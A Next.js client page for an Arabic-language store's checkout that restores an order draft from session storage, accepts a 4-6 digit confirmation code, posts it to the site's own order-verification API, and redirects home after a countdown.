'use client';

import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { useEffect, useState } from 'react';
import styles from './verify-phone.module.css';

const DRAFT_KEY = 'erd-algwal-checkout-draft-v1';
type CheckoutDraft = {
  phone?: unknown;
  stage?: unknown;
  orderId?: unknown;
  orderNumber?: unknown;
  customerNotificationKey?: unknown;
  confirmedAt?: unknown;
};

function normalizeDigits(value: string) {
  return value
    .replace(/[٠-٩]/g, (digit) => String('٠١٢٣٤٥٦٧٨٩'.indexOf(digit)))
    .replace(/[۰-۹]/g, (digit) => String('۰۱۲۳۴۵۶۷۸۹'.indexOf(digit)))
    .replace(/[^0-9]/g, '');
}

function formatPhone(value: string) {
  const phone = normalizeDigits(value);
  if (phone.length !== 10) return phone;
  return `${phone.slice(0, 3)} ${phone.slice(3, 6)} ${phone.slice(6)}`;
}

export default function VerifyPhonePage() {
  const router = useRouter();
  const [phone, setPhone] = useState('');
  const [orderId, setOrderId] = useState('');
  const [orderNumber, setOrderNumber] = useState('');
  const [customerNotificationKey, setCustomerNotificationKey] = useState('');
  const [draftReady, setDraftReady] = useState(false);
  const [referenceCode, setReferenceCode] = useState('');
  const [error, setError] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [verified, setVerified] = useState(false);
  const [confirmedAt, setConfirmedAt] = useState<number | null>(null);
  const [countdown, setCountdown] = useState(0);
  const isReferenceCodeValid = /^[0-9]{4,6}$/.test(referenceCode);

  useEffect(() => {
    try {
      const raw = window.sessionStorage.getItem(DRAFT_KEY);
      const draft = raw ? JSON.parse(raw) as CheckoutDraft : null;
      const savedPhone = typeof draft?.phone === 'string' ? normalizeDigits(draft.phone) : '';
      const savedOrderId = typeof draft?.orderId === 'string' ? draft.orderId : '';
      const savedKey = typeof draft?.customerNotificationKey === 'string' ? draft.customerNotificationKey : '';
      const savedConfirmedAt = typeof draft?.confirmedAt === 'number' && Number.isFinite(draft.confirmedAt)
        ? draft.confirmedAt
        : null;
      if (
        (draft?.stage === 'phone-verification' || draft?.stage === 'confirmed') &&
        savedPhone.length === 10 &&
        savedOrderId &&
        savedKey
      ) {
        setPhone(savedPhone);
        setOrderId(savedOrderId);
        setOrderNumber(typeof draft.orderNumber === 'string' ? draft.orderNumber : '');
        setCustomerNotificationKey(savedKey);
        setVerified(draft.stage === 'confirmed');
        setConfirmedAt(draft.stage === 'confirmed' ? savedConfirmedAt : null);
        setDraftReady(true);
      }
    } catch {
      // Keep the confirmation page unavailable when the checkout draft is invalid.
    }
  }, []);

  useEffect(() => {
    if (!verified) {
      setCountdown(0);
      return;
    }

    const verificationTime = confirmedAt ?? Date.now();
    const redirectTimer = window.setTimeout(
      () => router.replace('/'),
      Math.max(0, verificationTime + 30_000 - Date.now())
    );
    const updateCountdown = () => {
      setCountdown(Math.max(0, Math.ceil((verificationTime + 30_000 - Date.now()) / 1000)));
    };

    updateCountdown();
    const interval = window.setInterval(updateCountdown, 250);
    return () => {
      window.clearInterval(interval);
      window.clearTimeout(redirectTimer);
    };
  }, [confirmedAt, verified, router]);

  async function handleVerify() {
    if (!isReferenceCodeValid) {
      setError('أدخل رمز التأكيد المكوّن من 4 إلى 6 أرقام.');
      return;
    }
    if (isVerifying || verified) return;

    setIsVerifying(true);
    setError('');
    try {
      const response = await fetch('/api/orders/verify-confirmation-otp', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          orderId,
          customerNotificationKey,
          code: referenceCode
        })
      });
      const result = await response.json() as { ok?: boolean; error?: string; message?: string };
      if (!response.ok || !result.ok) {
        setError(result.error || 'تعذر تسجيل الرقم المرجعي. حاول مرة أخرى.');
        return;
      }

      const verificationTime = Date.now();
      setConfirmedAt(verificationTime);
      setVerified(true);
      setError('');
      try {
        const raw = window.sessionStorage.getItem(DRAFT_KEY);
        const draft = raw ? JSON.parse(raw) as Record<string, unknown> : {};
        window.sessionStorage.setItem(DRAFT_KEY, JSON.stringify({
          ...draft,
          stage: 'confirmed',
          confirmedAt: verificationTime
        }));
      } catch {
        // The server-side reference submission remains saved even if local storage is unavailable.
      }
    } catch {
      setError('تعذر الاتصال بالإدارة. حاول مرة أخرى.');
    } finally {
      setIsVerifying(false);
    }
  }

  if (!draftReady) {
    return (
      <main className={styles.page}>
        <section className={styles.card} aria-labelledby="verify-title">
          <div className={styles.icon} aria-hidden="true"><PhoneIcon /></div>
          <h1 id="verify-title">تأكيد الطلب</h1>
          <p className={styles.sub}>لا توجد بيانات طلب جاهزة للتأكيد.</p>
          <Link href="/checkout/store" className={styles.backLink}>العودة لإدخال بيانات الطلب</Link>
        </section>
      </main>
    );
  }

  return (
    <main className={styles.page}>
      <section className={styles.card} aria-labelledby="verify-title">
        <div className={styles.icon} aria-hidden="true"><PhoneIcon /></div>

        {verified ? (
          <>
            <h1 id="verify-title">تم تسجيل الرقم المرجعي</h1>
            {countdown > 0 ? (
              <div
                className={styles.timerRow}
                role="timer"
                aria-label={`الوقت المتبقي ${countdown} ثانية`}
              >
                <strong style={{ fontSize: 34, lineHeight: 1.2, color: '#5b2a9e', fontVariantNumeric: 'tabular-nums' }}>
                  00:{String(countdown).padStart(2, '0')}
                </strong>
              </div>
            ) : null}
          </>
        ) : (
          <>
            <h1 id="verify-title">تأكيد الطلب</h1>
            <p className={styles.sub}>تم إرسال طلبك إلى الإدارة للمراجعة.</p>
            {orderNumber ? <p className={styles.phone}>رقم الطلب: {orderNumber}</p> : null}
            <p className={styles.sub}>رقم الجوال المرتبط بالطلب:</p>
            <p className={styles.phone} dir="ltr">{formatPhone(phone)}</p>
            <p className={styles.notice}>أدخل رمز التأكيد فقط</p>

            <div className={styles.inputs} dir="ltr">
              <input
                type="text"
                inputMode="numeric"
                autoComplete="off"
                pattern="[0-9]*"
                maxLength={6}
                value={referenceCode}
                onChange={(event) => {
                  setReferenceCode(normalizeDigits(event.target.value).slice(0, 6));
                  setError('');
                }}
                aria-label="رمز التأكيد من 4 إلى 6 أرقام"
                disabled={isVerifying}
              />
            </div>

            <div className={styles.error} role="alert" aria-live="polite">{error}</div>

            <button
              type="button"
              className={styles.verifyButton}
              onClick={() => { void handleVerify(); }}
              disabled={!isReferenceCodeValid || isVerifying}
            >
              {isVerifying ? 'جارٍ الإرسال...' : 'متابعة'}
            </button>
            <Link href="/" className={styles.backLink}>العودة إلى المتجر</Link>
          </>
        )}
      </section>
    </main>
  );
}

function PhoneIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <rect x="6" y="2" width="12" height="20" rx="2" />
      <line x1="12" y1="18" x2="12.01" y2="18" />
    </svg>
  );
}
